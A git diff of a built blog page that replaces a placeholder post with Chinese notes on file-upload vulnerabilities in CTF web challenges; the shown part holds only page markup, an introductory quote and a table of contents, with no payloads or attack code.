@@ -98,7 +98,7 @@ const clarityId = "";
 			}
 		}, 10000);
 	})();
-})();</script><!-- SEO Meta Tags, Open Graph, Twitter Card, Favicons, Theme Init --><!-- SEO Meta Tags --> <title>First CTF Note - Freya&#39;s Blog</title> <meta name="description" content="This is a sample note. Replace it with a real CTF writeup when you are ready.">  <meta name="author" content="Freya"> <!-- Open Graph Tags --> <meta property="og:site_name" content="Freya's Blog"> <meta property="og:url" content="https://freya-we.github.io/posts/first-ctf-note/"> <meta property="og:title" content="First CTF Note - Freya's Blog"> <meta property="og:description" content="This is a sample note. Replace it with a real CTF writeup when you are ready."> <meta property="og:image" content="https://freya-we.github.io/assets/freya/banner.jpg"> <meta property="og:image:width" content="1200"> <meta property="og:image:height" content="630"> <meta property="og:type" content="article"> <!-- Twitter Card Tags --> <meta name="twitter:card" content="summary_large_image"> <meta property="twitter:url" content="https://freya-we.github.io/posts/first-ctf-note/"> <meta name="twitter:title" content="First CTF Note - Freya's Blog"> <meta name="twitter:description" content="This is a sample note. Replace it with a real CTF writeup when you are ready."> <meta name="twitter:image" content="https://freya-we.github.io/assets/freya/banner.jpg"> <!-- Viewport and Generator --> <meta name="viewport" content="width=device-width"> <meta name="generator" content="Astro v7.0.4"> <!-- Favicons --> <link rel="icon" href="/favicon/favicon.ico" sizes="64x64" media="(prefers-color-scheme: light)"><link rel="icon" href="/favicon/favicon.ico" sizes="64x64" media="(prefers-color-scheme: dark)"> <!-- 字体通过构建脚本压缩到 /assets/font/ 目录，此处不再预加载以避免 404 --> <!-- 字体在构建时通过 scripts/compress-fonts.js 处理并复制到 dist/ --> <!-- 预连接 Iconify API 以减少图标加载延迟 --> <link rel="preconnect" href="https://api.iconify.design" crossorigin> <!-- Set the theme before the page is rendered to avoid a flash --> <script>(function(){const DEFAULT_THEME = "light";
+})();</script><!-- SEO Meta Tags, Open Graph, Twitter Card, Favicons, Theme Init --><!-- SEO Meta Tags --> <title>CTF Web 文件上传笔记 - Freya&#39;s Blog</title> <meta name="description" content="整理 CTF Web 文件上传题中常见的校验绕过、解析差异和逻辑漏洞。">  <meta name="author" content="Freya"> <!-- Open Graph Tags --> <meta property="og:site_name" content="Freya's Blog"> <meta property="og:url" content="https://freya-we.github.io/posts/ctf-web-file-upload/"> <meta property="og:title" content="CTF Web 文件上传笔记 - Freya's Blog"> <meta property="og:description" content="整理 CTF Web 文件上传题中常见的校验绕过、解析差异和逻辑漏洞。"> <meta property="og:image" content="https://freya-we.github.io/assets/freya/banner.jpg"> <meta property="og:image:width" content="1200"> <meta property="og:image:height" content="630"> <meta property="og:type" content="article"> <!-- Twitter Card Tags --> <meta name="twitter:card" content="summary_large_image"> <meta property="twitter:url" content="https://freya-we.github.io/posts/ctf-web-file-upload/"> <meta name="twitter:title" content="CTF Web 文件上传笔记 - Freya's Blog"> <meta name="twitter:description" content="整理 CTF Web 文件上传题中常见的校验绕过、解析差异和逻辑漏洞。"> <meta name="twitter:image" content="https://freya-we.github.io/assets/freya/banner.jpg"> <!-- Viewport and Generator --> <meta name="viewport" content="width=device-width"> <meta name="generator" content="Astro v7.0.4"> <!-- Favicons --> <link rel="icon" href="/favicon/favicon.ico" sizes="64x64" media="(prefers-color-scheme: light)"><link rel="icon" href="/favicon/favicon.ico" sizes="64x64" media="(prefers-color-scheme: dark)"> <!-- 字体通过构建脚本压缩到 /assets/font/ 目录，此处不再预加载以避免 404 --> <!-- 字体在构建时通过 scripts/compress-fonts.js 处理并复制到 dist/ --> <!-- 预连接 Iconify API 以减少图标加载延迟 --> <link rel="preconnect" href="https://api.iconify.design" crossorigin> <!-- Set the theme before the page is rendered to avoid a flash --> <script>(function(){const DEFAULT_THEME = "light";
 const LIGHT_MODE = "light";
 const DARK_MODE = "dark";
 const BANNER_HEIGHT_EXTEND = 30;
@@ -193,7 +193,7 @@ const pageScaling = {"enable":true,"targetWidth":2000};
 			window.swup.options.updateHead = false;
 		}
 	}
-})();</script><!-- defines global css variables. This will be applied to <html> <body> and some other elements idk why --><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","headline":"First CTF Note","description":"This is a sample note. Replace it with a real CTF writeup when you are ready.","keywords":["CTF"],"author":{"@type":"Person","name":"Freya","url":"https://freya-we.github.io/"},"datePublished":"2026-02-07","inLanguage":"zh-CN"}</script><!-- Global CSS variables for page width and hue --><link rel="alternate" type="application/rss+xml" title="Freya" href="https://freya-we.github.io/rss.xml"><link rel="stylesheet" href="/_astro/katex.CLz4Jbk5.css"><link rel="stylesheet" href="/_astro/fancybox.y3Ble-Pa.css"><style>.badge.svelte-5lgona{transition:all .2s ease;padding:0 .5rem;height:1.75rem;min-width:2rem;border-radius:.5rem;font-size:.875rem;font-weight:700;color:var(--btn-content);background-color:oklch(.95 .025 var(--hue));display:flex;align-items:center;justify-content:center}.dark .badge.svelte-5lgona{color:var(--deep-text);background-color:var(--primary)}
+})();</script><!-- defines global css variables. This will be applied to <html> <body> and some other elements idk why --><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","headline":"CTF Web 文件上传笔记","description":"整理 CTF Web 文件上传题中常见的校验绕过、解析差异和逻辑漏洞。","keywords":["CTF","Web","文件上传"],"author":{"@type":"Person","name":"Freya","url":"https://freya-we.github.io/"},"datePublished":"2026-08-04","inLanguage":"zh-CN"}</script><!-- Global CSS variables for page width and hue --><link rel="alternate" type="application/rss+xml" title="Freya" href="https://freya-we.github.io/rss.xml"><link rel="stylesheet" href="/_astro/katex.CLz4Jbk5.css"><link rel="stylesheet" href="/_astro/fancybox.y3Ble-Pa.css"><style>.badge.svelte-5lgona{transition:all .2s ease;padding:0 .5rem;height:1.75rem;min-width:2rem;border-radius:.5rem;font-size:.875rem;font-weight:700;color:var(--btn-content);background-color:oklch(.95 .025 var(--hue));display:flex;align-items:center;justify-content:center}.dark .badge.svelte-5lgona{color:var(--deep-text);background-color:var(--primary)}
 .chip-wrapper.svelte-s9q764{display:block;width:100%;text-decoration:none}.chip.svelte-s9q764{width:100%;height:2.5rem;border-radius:.5rem;background:none;transition:all .2s ease;padding-left:.5rem;display:flex;align-items:center;cursor:pointer;border:none;color:inherit}.chip.svelte-s9q764:hover{background-color:var(--btn-plain-bg-hover);padding-left:.75rem}.chip.svelte-s9q764:active{background-color:var(--btn-plain-bg-active)}.chip-content.svelte-s9q764{overflow:hidden;text-align:left;white-space:nowrap;text-overflow:ellipsis;flex:1}.chip-dot.svelte-s9q764{height:.25rem;width:.25rem;background-color:var(--btn-content);transition:all .2s ease;border-radius:.25rem;margin-right:.5rem;flex-shrink:0}.dark .chip-dot.svelte-s9q764{background-color:var(--card-bg)}.chip-badge.svelte-s9q764{transition:all .2s ease;padding:0 .5rem;height:1.75rem;min-width:2rem;border-radius:.5rem;font-size:.875rem;font-weight:700;color:var(--btn-content);background-color:oklch(.95 .025 var(--hue));display:flex;align-items:center;justify-content:center;margin-left:1rem;flex-shrink:0}.dark .chip-badge.svelte-s9q764{color:var(--deep-text);background-color:var(--primary)}.chip-wrapper.svelte-s9q764:hover .chip:where(.svelte-s9q764){color:var(--primary)}.dark .chip-wrapper.svelte-s9q764:hover .chip:where(.svelte-s9q764){color:var(--primary)}
 .custom-scrollbar[data-astro-cid-6kqqbxxy]{overflow:auto;position:relative}.horizontal-scrollbar[data-astro-cid-6kqqbxxy]{overflow-x:auto;overflow-y:hidden}.vertical-scrollbar[data-astro-cid-6kqqbxxy]{overflow-y:auto;overflow-x:hidden}.custom-scrollbar[data-astro-cid-6kqqbxxy]::-webkit-scrollbar{display:none}.custom-scrollbar[data-astro-cid-6kqqbxxy]{-ms-overflow-style:none;scrollbar-width:none}.custom-scrollbar[data-astro-cid-6kqqbxxy]:after{content:"";position:absolute;background:#e5e7eb;border-radius:4px;opacity:0;transition:opacity .3s;pointer-events:none}.horizontal-scrollbar[data-astro-cid-6kqqbxxy]:after{bottom:2px;left:0;right:0;height:6px}.vertical-scrollbar[data-astro-cid-6kqqbxxy]:after{right:2px;top:0;bottom:0;width:6px}.custom-scrollbar[data-astro-cid-6kqqbxxy]:before{content:"";position:absolute;background:#6366f1;border-radius:4px;opacity:0;transition:opacity .3s;pointer-events:none}.horizontal-scrollbar[data-astro-cid-6kqqbxxy]:before{bottom:2px;height:6px;min-width:20px}.vertical-scrollbar[data-astro-cid-6kqqbxxy]:before{right:2px;width:6px;min-height:20px}.custom-scrollbar[data-astro-cid-6kqqbxxy]:hover:after,.custom-scrollbar[data-astro-cid-6kqqbxxy]:hover:before{opacity:1}.dark[data-astro-cid-6kqqbxxy] .custom-scrollbar[data-astro-cid-6kqqbxxy]:after{background:#374151}.dark[data-astro-cid-6kqqbxxy] .custom-scrollbar[data-astro-cid-6kqqbxxy]:before{background:#6366f1}.custom-scrollbar[data-astro-cid-6kqqbxxy]:active:after,.custom-scrollbar[data-astro-cid-6kqqbxxy]:active:before,.custom-scrollbar[data-astro-cid-6kqqbxxy]:focus:after,.custom-scrollbar[data-astro-cid-6kqqbxxy]:focus:before{opacity:1}
 .filter-tabs[data-astro-cid-j6zuvnab]{display:flex;flex-wrap:wrap;gap:.5rem}.filter-tabs-item[data-astro-cid-j6zuvnab]{display:inline-flex;align-items:center;gap:.375rem;padding:.5rem 1rem;border:1px solid var(--line-divider);border-radius:var(--radius-large);background:var(--btn-regular-bg);color:var(--btn-content);font-size:.875rem;font-weight:500;cursor:pointer;transition:all .2s;white-space:nowrap}.filter-tabs-item[data-astro-cid-j6zuvnab] iconify-icon[data-astro-cid-j6zuvnab]{flex-shrink:0;opacity:.7;transition:opacity .2s}.filter-tabs-item[data-astro-cid-j6zuvnab]:hover:not(.active){background:var(--btn-regular-bg-hover);border-color:var(--primary)}.filter-tabs-item[data-astro-cid-j6zuvnab]:hover:not(.active) iconify-icon[data-astro-cid-j6zuvnab]{opacity:1}.filter-tabs-item[data-astro-cid-j6zuvnab].active{background:var(--primary);color:#fff;border-color:var(--primary)}.filter-tabs-item[data-astro-cid-j6zuvnab].active iconify-icon[data-astro-cid-j6zuvnab]{opacity:1}.filter-tabs-count[data-astro-cid-j6zuvnab]{opacity:.6;font-size:.8rem}@media(width<768px){.filter-tabs[data-astro-cid-j6zuvnab]{gap:.375rem}.filter-tabs-item[data-astro-cid-j6zuvnab]{padding:.4rem .8rem;font-size:.8rem}.filter-tabs-count[data-astro-cid-j6zuvnab]{display:none}}
@@ -2128,12 +2128,14 @@ const lastPostDate = "2026-08-04T00:00:00.000Z";
 
 	// 每小时更新一次（可选，因为天数变化较慢）
 	setInterval(updateDynamicStats, 60 * 60 * 1000);
-})();</script> </div> </div> <div id="right-sidebar-sticky" class="transition-all duration-700 flex flex-col w-full gap-4 sticky top-4 sidebar-sticky-column">    </div> </div> </div> </div> <main id="swup-container" class="transition-swup-fade overflow-hidden w-full col-span-1 row-start-1 row-end-2 md:col-start-2 md:col-end-3 lg:col-start-2 lg:col-end-3 transition-main" data-astro-cid-m6cpsp63> <div id="content-wrapper" class="onload-animation transition-leaving" data-astro-cid-m6cpsp63> <div id="page-overlay-data" data-title="First CTF Note" data-date="2026-02-07" data-category="Notes" data-words="47" data-is-post="true" data-is-home="false" data-wallpaper-mode="fullscreen" class="hidden" data-astro-cid-m6cpsp63></div>   <script type="module" src="/_astro/_...slug_.astro_astro_type_script_index_0_lang.Kb0y7PLx.js"></script><div class="flex w-full rounded-(--radius-large) overflow-hidden relative mb-4"> <div id="post-container" class="card-base z-10 px-6 md:px-9 pt-6 pb-4 relative w-full "> <!-- word count and reading time --> <div class="flex flex-row text-black/30 dark:text-white/30 gap-5 mb-3 transition onload-animation"> <div class="flex flex-row items-center"> <div class="flex items-center">  <div class="h-6 w-6 rounded-md bg-black/5 dark:bg-white/10 text-black/50 dark:text-white/50 flex items-center justify-center mr-2"> <svg width="1em" height="1em" class="text-xl" data-icon="material-symbols:notes-rounded">   <symbol id="ai:material-symbols:notes-rounded" viewBox="0 0 24 24"><path fill="currentColor" d="M4 18q-.425 0-.712-.288T3 17t.288-.712T4 16h10q.425 0 .713.288T15 17t-.288.713T14 18zm0-5q-.425 0-.712-.288T3 12t.288-.712T4 11h16q.425 0 .713.288T21 12t-.288.713T20 13zm0-5q-.425 0-.712-.288T3 7t.288-.712T4 6h16q.425 0 .713.288T21 7t-.288.713T20 8z"/></symbol><use href="#ai:material-symbols:notes-rounded"></use>  </svg> </div>  <div class="text-sm"> 47  字 </div> </div> </div> <div class="flex flex-row items-center"> <div class="flex items-center">  <div class="h-6 w-6 rounded-md bg-black/5 dark:bg-white/10 text-black/50 dark:text-white/50 flex items-center justify-center mr-2"> <svg width="1em" height="1em" class="text-xl" data-icon="material-symbols:schedule-outline-rounded">   <symbol id="ai:material-symbols:schedule-outline-rounded" viewBox="0 0 24 24"><path fill="currentColor" d="M13 11.6V8q0-.425-.288-.712T12 7t-.712.288T11 8v3.975q0 .2.075.388t.225.337l3.3 3.3q.275.275.7.275T16 16t.275-.7t-.275-.7zM12 22q-2.075 0-3.9-.788t-3.175-2.137T2.788 15.9T2 12t.788-3.9t2.137-3.175T8.1 2.788T12 2t3.9.788t3.175 2.137T21.213 8.1T22 12t-.788 3.9t-2.137 3.175t-3.175 2.138T12 22m0-2q3.325 0 5.663-2.337T20 12t-2.337-5.663T12 4T6.337 6.338T4 12t2.338 5.663T12 20"/></symbol><use href="#ai:material-symbols:schedule-outline-rounded"></use>  </svg> </div>  <div class="text-sm"> 1  分钟 </div> </div> </div> </div> <!-- title --> <div class="relative onload-animation"> <div data-pagefind-body data-pagefind-weight="10" data-pagefind-meta="title" class="transition w-full block font-bold mb-3
+})();</script> </div> </div> <div id="right-sidebar-sticky" class="transition-all duration-700 flex flex-col w-full gap-4 sticky top-4 sidebar-sticky-column">    </div> </div> </div> </div> <main id="swup-container" class="transition-swup-fade overflow-hidden w-full col-span-1 row-start-1 row-end-2 md:col-start-2 md:col-end-3 lg:col-start-2 lg:col-end-3 transition-main" data-astro-cid-m6cpsp63> <div id="content-wrapper" class="onload-animation transition-leaving" data-astro-cid-m6cpsp63> <div id="page-overlay-data" data-title="CTF Web 文件上传笔记" data-date="2026-08-04" data-category="Web安全" data-words="3192" data-is-post="true" data-is-home="false" data-wallpaper-mode="fullscreen" class="hidden" data-astro-cid-m6cpsp63></div>   <script type="module" src="/_astro/_...slug_.astro_astro_type_script_index_0_lang.Kb0y7PLx.js"></script><div class="flex w-full rounded-(--radius-large) overflow-hidden relative mb-4"> <div id="post-container" class="card-base z-10 px-6 md:px-9 pt-6 pb-4 relative w-full "> <!-- word count and reading time --> <div class="flex flex-row text-black/30 dark:text-white/30 gap-5 mb-3 transition onload-animation"> <div class="flex flex-row items-center"> <div class="flex items-center">  <div class="h-6 w-6 rounded-md bg-black/5 dark:bg-white/10 text-black/50 dark:text-white/50 flex items-center justify-center mr-2"> <svg width="1em" height="1em" class="text-xl" data-icon="material-symbols:notes-rounded">   <symbol id="ai:material-symbols:notes-rounded" viewBox="0 0 24 24"><path fill="currentColor" d="M4 18q-.425 0-.712-.288T3 17t.288-.712T4 16h10q.425 0 .713.288T15 17t-.288.713T14 18zm0-5q-.425 0-.712-.288T3 12t.288-.712T4 11h16q.425 0 .713.288T21 12t-.288.713T20 13zm0-5q-.425 0-.712-.288T3 7t.288-.712T4 6h16q.425 0 .713.288T21 7t-.288.713T20 8z"/></symbol><use href="#ai:material-symbols:notes-rounded"></use>  </svg> </div>  <div class="text-sm"> 3192  字 </div> </div> </div> <div class="flex flex-row items-center"> <div class="flex items-center">  <div class="h-6 w-6 rounded-md bg-black/5 dark:bg-white/10 text-black/50 dark:text-white/50 flex items-center justify-center mr-2"> <svg width="1em" height="1em" class="text-xl" data-icon="material-symbols:schedule-outline-rounded">   <symbol id="ai:material-symbols:schedule-outline-rounded" viewBox="0 0 24 24"><path fill="currentColor" d="M13 11.6V8q0-.425-.288-.712T12 7t-.712.288T11 8v3.975q0 .2.075.388t.225.337l3.3 3.3q.275.275.7.275T16 16t.275-.7t-.275-.7zM12 22q-2.075 0-3.9-.788t-3.175-2.137T2.788 15.9T2 12t.788-3.9t2.137-3.175T8.1 2.788T12 2t3.9.788t3.175 2.137T21.213 8.1T22 12t-.788 3.9t-2.137 3.175t-3.175 2.138T12 22m0-2q3.325 0 5.663-2.337T20 12t-2.337-5.663T12 4T6.337 6.338T4 12t2.338 5.663T12 20"/></symbol><use href="#ai:material-symbols:schedule-outline-rounded"></use>  </svg> </div>  <div class="text-sm"> 9  分钟 </div> </div> </div> </div> <!-- title --> <div class="relative onload-animation"> <div data-pagefind-body data-pagefind-weight="10" data-pagefind-meta="title" class="transition w-full block font-bold mb-3
                     text-3xl md:text-[2.25rem]/[2.75rem]
                     text-black/90 dark:text-white/90
                     md:before:w-1 before:h-5 before:rounded-md before:bg-(--primary)
-                    before:absolute before:top-3 before:-left-4.5"> First CTF Note </div> </div> <!-- metadata --> <div class="onload-animation"> <div class="flex flex-wrap text-neutral-500 dark:text-neutral-400 items-center gap-4 gap-x-4 gap-y-2 mb-5"> <div class="flex items-center"> <div class="meta-icon"> <svg width="1em" height="1em" class="text-xl" data-icon="material-symbols:calendar-today-outline-rounded">   <symbol id="ai:material-symbols:calendar-today-outline-rounded" viewBox="0 0 24 24"><path fill="currentColor" d="M5 22q-.825 0-1.412-.587T3 20V6q0-.825.588-1.412T5 4h1V3q0-.425.288-.712T7 2t.713.288T8 3v1h8V3q0-.425.288-.712T17 2t.713.288T18 3v1h1q.825 0 1.413.588T21 6v14q0 .825-.587 1.413T19 22zm0-2h14V10H5zM5 8h14V6H5zm0 0V6z"/></symbol><use href="#ai:material-symbols:calendar-today-outline-rounded"></use>  </svg> </div> <span class="text-50 text-sm font-medium">2026-02-07</span> </div>  <div class="flex items-center"> <div class="meta-icon"> <svg width="1em" height="1em" class="text-xl" data-icon="material-symbols:book-2-outline-rounded">   <symbol id="ai:material-symbols:book-2-outline-rounded" viewBox="0 0 24 24"><path fill="currentColor" d="M6 15.325q.35-.175.725-.25T7.5 15H8V4h-.5q-.625 0-1.062.438T6 5.5zM10 15h8V4h-8zm-4 .325V4zM7.5 22q-1.45 0-2.475-1.025T4 18.5v-13q0-1.45 1.025-2.475T7.5 2H18q.825 0 1.413.587T20 4v12.525q0 .2-.162.363t-.588.362q-.35.175-.55.5t-.2.75t.2.763t.55.487t.55.413t.2.562v.25q0 .425-.288.725T19 22zm0-2h9.325q-.15-.35-.237-.712T16.5 18.5q0-.4.075-.775t.25-.725H7.5q-.65 0-1.075.438T6 18.5q0 .65.425 1.075T7.5 20"/></symbol><use href="#ai:material-symbols:book-2-outline-rounded"></use>  </svg> </div> <div class="flex flex-row flex-nowrap items-center"> <a href="/archive/?category=Notes" aria-label="View all posts in the Notes category" class="link-lg transition text-50 text-sm font-medium hover:text-(--primary) dark:hover:text-(--primary) whitespace-nowrap"> Notes </a> </div> </div>   <div class="items-center flex"> <div class="meta-icon"> <svg width="1em" height="1em" class="text-xl" data-icon="material-symbols:tag-rounded">   <symbol id="ai:material-symbols:tag-rounded" viewBox="0 0 24 24"><path fill="currentColor" d="m9 16l-.825 3.275q-.075.325-.325.525t-.6.2q-.475 0-.775-.375T6.3 18.8L7 16H4.275q-.5 0-.8-.387T3.3 14.75q.075-.35.35-.55t.625-.2H7.5l1-4H5.775q-.5 0-.8-.387T4.8 8.75q.075-.35.35-.55t.625-.2H9l.825-3.275Q9.9 4.4 10.15 4.2t.6-.2q.475 0 .775.375t.175.825L11 8h4l.825-3.275q.075-.325.325-.525t.6-.2q.475 0 .775.375t.175.825L17 8h2.725q.5 0 .8.387t.175.863q-.075.35-.35.55t-.625.2H16.5l-1 4h2.725q.5 0 .8.388t.175.862q-.075.35-.35.55t-.625.2H15l-.825 3.275q-.075.325-.325.525t-.6.2q-.475 0-.775-.375T12.3 18.8L13 16zm.5-2h4l1-4h-4z"/></symbol><use href="#ai:material-symbols:tag-rounded"></use>  </svg> </div> <div class="flex flex-row flex-nowrap items-center">  <div class="hidden mx-1.5 text-(--meta-divider) text-sm">/</div> <a href="/archive/?tag=CTF" aria-label="View all posts with the CTF tag" class="link-lg transition text-50 text-sm font-medium
-                                        hover:text-(--primary) dark:hover:text-(--primary) whitespace-nowrap"> CTF </a>   </div> </div> <div class="flex items-center umami-page-views hidden" data-id="first-ctf-note"> <div class="meta-icon"> <svg width="1em" height="1em" class="text-xl" data-icon="material-symbols:visibility-outline-rounded">   <symbol id="ai:material-symbols:visibility-outline-rounded" viewBox="0 0 24 24"><path fill="currentColor" d="M15.188 14.688Q16.5 13.375 16.5 11.5t-1.312-3.187T12 7T8.813 8.313T7.5 11.5t1.313 3.188T12 16t3.188-1.312m-5.1-1.276Q9.3 12.625 9.3 11.5t.788-1.912T12 8.8t1.913.788t.787 1.912t-.787 1.913T12 14.2t-1.912-.787m-4.2 3.787q-2.763-1.8-4.363-4.75q-.125-.225-.187-.462t-.063-.488t.063-.488t.187-.462q1.6-2.95 4.363-4.75T12 4t6.113 1.8t4.362 4.75q.125.225.188.463t.062.487t-.062.488t-.188.462q-1.6 2.95-4.362 4.75T12 19t-6.113-1.8m11.3-1.687Q19.55 14.025 20.8 11.5q-1.25-2.525-3.613-4.012T12 6T6.813 7.488T3.2 11.5q1.25 2.525 3.613 4.013T12 17t5.188-1.487"/></symbol><use href="#ai:material-symbols:visibility-outline-rounded"></use>  </svg> </div> <span class="text-50 text-sm font-medium page-views-display">统计加载中...</span> </div>  </div> <script>(function(){const pageViewsText = "浏览量";
+                    before:absolute before:top-3 before:-left-4.5"> CTF Web 文件上传笔记 </div> </div> <!-- metadata --> <div class="onload-animation"> <div class="flex flex-wrap text-neutral-500 dark:text-neutral-400 items-center gap-4 gap-x-4 gap-y-2 mb-5"> <div class="flex items-center"> <div class="meta-icon"> <svg width="1em" height="1em" class="text-xl" data-icon="material-symbols:calendar-today-outline-rounded">   <symbol id="ai:material-symbols:calendar-today-outline-rounded" viewBox="0 0 24 24"><path fill="currentColor" d="M5 22q-.825 0-1.412-.587T3 20V6q0-.825.588-1.412T5 4h1V3q0-.425.288-.712T7 2t.713.288T8 3v1h8V3q0-.425.288-.712T17 2t.713.288T18 3v1h1q.825 0 1.413.588T21 6v14q0 .825-.587 1.413T19 22zm0-2h14V10H5zM5 8h14V6H5zm0 0V6z"/></symbol><use href="#ai:material-symbols:calendar-today-outline-rounded"></use>  </svg> </div> <span class="text-50 text-sm font-medium">2026-08-04</span> </div>  <div class="flex items-center"> <div class="meta-icon"> <svg width="1em" height="1em" class="text-xl" data-icon="material-symbols:book-2-outline-rounded">   <symbol id="ai:material-symbols:book-2-outline-rounded" viewBox="0 0 24 24"><path fill="currentColor" d="M6 15.325q.35-.175.725-.25T7.5 15H8V4h-.5q-.625 0-1.062.438T6 5.5zM10 15h8V4h-8zm-4 .325V4zM7.5 22q-1.45 0-2.475-1.025T4 18.5v-13q0-1.45 1.025-2.475T7.5 2H18q.825 0 1.413.587T20 4v12.525q0 .2-.162.363t-.588.362q-.35.175-.55.5t-.2.75t.2.763t.55.487t.55.413t.2.562v.25q0 .425-.288.725T19 22zm0-2h9.325q-.15-.35-.237-.712T16.5 18.5q0-.4.075-.775t.25-.725H7.5q-.65 0-1.075.438T6 18.5q0 .65.425 1.075T7.5 20"/></symbol><use href="#ai:material-symbols:book-2-outline-rounded"></use>  </svg> </div> <div class="flex flex-row flex-nowrap items-center"> <a href="/archive/?category=Web%E5%AE%89%E5%85%A8" aria-label="View all posts in the Web安全 category" class="link-lg transition text-50 text-sm font-medium hover:text-(--primary) dark:hover:text-(--primary) whitespace-nowrap"> Web安全 </a> </div> </div>   <div class="items-center flex"> <div class="meta-icon"> <svg width="1em" height="1em" class="text-xl" data-icon="material-symbols:tag-rounded">   <symbol id="ai:material-symbols:tag-rounded" viewBox="0 0 24 24"><path fill="currentColor" d="m9 16l-.825 3.275q-.075.325-.325.525t-.6.2q-.475 0-.775-.375T6.3 18.8L7 16H4.275q-.5 0-.8-.387T3.3 14.75q.075-.35.35-.55t.625-.2H7.5l1-4H5.775q-.5 0-.8-.387T4.8 8.75q.075-.35.35-.55t.625-.2H9l.825-3.275Q9.9 4.4 10.15 4.2t.6-.2q.475 0 .775.375t.175.825L11 8h4l.825-3.275q.075-.325.325-.525t.6-.2q.475 0 .775.375t.175.825L17 8h2.725q.5 0 .8.387t.175.863q-.075.35-.35.55t-.625.2H16.5l-1 4h2.725q.5 0 .8.388t.175.862q-.075.35-.35.55t-.625.2H15l-.825 3.275q-.075.325-.325.525t-.6.2q-.475 0-.775-.375T12.3 18.8L13 16zm.5-2h4l1-4h-4z"/></symbol><use href="#ai:material-symbols:tag-rounded"></use>  </svg> </div> <div class="flex flex-row flex-nowrap items-center">  <div class="hidden mx-1.5 text-(--meta-divider) text-sm">/</div> <a href="/archive/?tag=CTF" aria-label="View all posts with the CTF tag" class="link-lg transition text-50 text-sm font-medium
+                                        hover:text-(--primary) dark:hover:text-(--primary) whitespace-nowrap"> CTF </a>  <div class="mx-1.5 text-(--meta-divider) text-sm">/</div> <a href="/archive/?tag=Web" aria-label="View all posts with the Web tag" class="link-lg transition text-50 text-sm font-medium
+                                        hover:text-(--primary) dark:hover:text-(--primary) whitespace-nowrap"> Web </a>  <div class="mx-1.5 text-(--meta-divider) text-sm">/</div> <a href="/archive/?tag=%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0" aria-label="View all posts with the 文件上传 tag" class="link-lg transition text-50 text-sm font-medium
+                                        hover:text-(--primary) dark:hover:text-(--primary) whitespace-nowrap"> 文件上传 </a>   </div> </div> <div class="flex items-center umami-page-views hidden" data-id="ctf-web-file-upload"> <div class="meta-icon"> <svg width="1em" height="1em" class="text-xl" data-icon="material-symbols:visibility-outline-rounded">   <symbol id="ai:material-symbols:visibility-outline-rounded" viewBox="0 0 24 24"><path fill="currentColor" d="M15.188 14.688Q16.5 13.375 16.5 11.5t-1.312-3.187T12 7T8.813 8.313T7.5 11.5t1.313 3.188T12 16t3.188-1.312m-5.1-1.276Q9.3 12.625 9.3 11.5t.788-1.912T12 8.8t1.913.788t.787 1.912t-.787 1.913T12 14.2t-1.912-.787m-4.2 3.787q-2.763-1.8-4.363-4.75q-.125-.225-.187-.462t-.063-.488t.063-.488t.187-.462q1.6-2.95 4.363-4.75T12 4t6.113 1.8t4.362 4.75q.125.225.188.463t.062.487t-.062.488t-.188.462q-1.6 2.95-4.362 4.75T12 19t-6.113-1.8m11.3-1.687Q19.55 14.025 20.8 11.5q-1.25-2.525-3.613-4.012T12 6T6.813 7.488T3.2 11.5q1.25 2.525 3.613 4.013T12 17t5.188-1.487"/></symbol><use href="#ai:material-symbols:visibility-outline-rounded"></use>  </svg> </div> <span class="text-50 text-sm font-medium page-views-display">统计加载中...</span> </div>  </div> <script>(function(){const pageViewsText = "浏览量";
 const visitsText = "访问次数";
 
     function generateStatsText(pageViews, visits) {
@@ -2175,17 +2177,1095 @@ const visitsText = "访问次数";
     } else {
         fetchPageViews();
     }
-})();</script>  </div> <!-- always show cover as long as it has one -->  <div class="mt-4"></div> <div id="post-cover" class="mb-8 rounded-xl banner-container onload-animation overflow-hidden relative"> <div class="transition absolute inset-0 dark:bg-black/10 bg-opacity-50 pointer-events-none"></div>   <img src="/assets/freya/banner.jpg" alt class="w-full h-full object-cover" style="object-position: center" loading="lazy" decoding="async"> </div>  <div data-pagefind-body class="prose dark:prose-invert prose-base !max-w-none custom-md mb-6 markdown-content onload-animation"> <!--<div class="prose dark:prose-invert max-w-none custom-md">--> <!--<div class="max-w-none custom-md">-->  <p>This is a sample note. Replace it with a real CTF writeup when you are ready.</p>
-<section><h2 id="summary">Summary<a class="anchor" href="#summary"><span class="anchor-icon" data-pagefind-ignore="">#</span></a></h2><ul>
-<li><strong>Challenge:</strong></li>
-<li><strong>Category:</strong></li>
-<li><strong>Key idea:</strong></li>
-<li><strong>Result:</strong></li>
-</ul></section>
-<section><h2 id="notes">Notes<a class="anchor" href="#notes"><span class="anchor-icon" data-pagefind-ignore="">#</span></a></h2><p>在这里继续记录你的解题过程、关键代码和复盘结论。</p></section>  </div> <script type="module">document.addEventListener("click",function(l){const o=l.target;if(o&&o.classList.contains("copy-btn")){const c=o.parentElement?.querySelector("code");let i="";if(c){const t=c.querySelectorAll("span.line");if(t.length>0){const e=[];for(let n=0;n<t.length;n++){const s=t[n].textContent||"";e.push(s)}i=e.join(`
+})();</script> <div class="mt-4 border-(--line-divider) border-dashed border-b mb-5"></div> </div> <!-- always show cover as long as it has one -->  <div data-pagefind-body class="prose dark:prose-invert prose-base !max-w-none custom-md mb-6 markdown-content onload-animation"> <!--<div class="prose dark:prose-invert max-w-none custom-md">--> <!--<div class="max-w-none custom-md">-->  <blockquote>
+<p>文件上传漏洞学到现在最大的感触就是要有自己的一套思维，不能光生搬硬套网上的payload，打靶场不能只照着wp去操作，一定有自己思考的过程</p>
+</blockquote>
+<hr>
+<section><h2 id="目录">目录<a class="anchor" href="#目录"><span class="anchor-icon" data-pagefind-ignore="">#</span></a></h2><ol>
+<li><a href="#%E4%B8%80%E6%BC%8F%E6%B4%9E%E6%9C%AC%E8%B4%A8%E4%B8%8E%E5%8E%9F%E7%90%86">漏洞本质与原理</a></li>
+<li><a href="#%E4%BA%8C%E6%A0%A1%E9%AA%8C%E6%9C%BA%E5%88%B6%E6%80%BB%E8%A7%88">校验机制总览</a></li>
+<li><a href="#%E4%B8%89%E5%89%8D%E7%AB%AF%E6%A0%A1%E9%AA%8C%E7%BB%95%E8%BF%87">前端校验绕过</a></li>
+<li><a href="#%E5%9B%9B%E6%9C%8D%E5%8A%A1%E7%AB%AF%E9%BB%91%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87">服务端黑名单绕过</a></li>
